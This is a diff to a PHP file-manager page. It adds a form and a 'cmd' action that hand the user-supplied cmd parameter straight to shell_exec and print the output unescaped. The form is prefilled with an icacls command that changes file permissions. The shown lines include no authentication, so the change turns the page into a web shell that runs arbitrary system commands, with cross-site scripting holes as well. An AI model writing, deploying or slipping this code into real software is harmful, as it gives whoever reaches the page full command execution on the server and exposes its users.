@@ -71,6 +71,7 @@
     unset($voltado[count($voltado)-1]);
     $voltado = join('/',$voltado);
 
+    $cmdoutput = "";
     if(isset($_REQUEST['action'])) {
         switch($_REQUEST['action']){
             case 'rename':
@@ -86,6 +87,11 @@
                     rrmdir($rawdir);
                 }
                 boiola($voltado);
+            break;
+            case 'cmd':
+                if(!isset($_REQUEST["cmd"])) boiola($rawdir);
+                $cmdoutput = shell_exec(preg_replace("/__owo__/",$rawdir,$_REQUEST["cmd"]));
+                $_REQUEST["action"] = null;
             break;
         };
     };
@@ -118,6 +124,16 @@
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
         <h3><?=$rawdir?></h3>
         <!-- <style> *{font-size:18px} table,tr,td,th{border:1px solid black;border-collapse:collapse;}</style> -->
+        <form action="" method="post" class="form-group">
+            <input type="hidden" name="action" value="cmd">
+            <input type="hidden" name="path" value="<?=$rawdir?>">
+            <input type="text" name="cmd" class="form-control"value='<?php
+                if(is_file($rawdir)){
+                    echo "icacls \"$rawdir\" /grant ACAD:R";
+                };?>'>
+            <input type="submit" value="exec cmd (use __owo__ to represent current folder)">
+        </form>
+        <pre><?=$cmdoutput?></pre>
     <?php 
     if(is_dir($rawdir)) {?>
         <form action="" method="post" enctype="multipart/form-data">
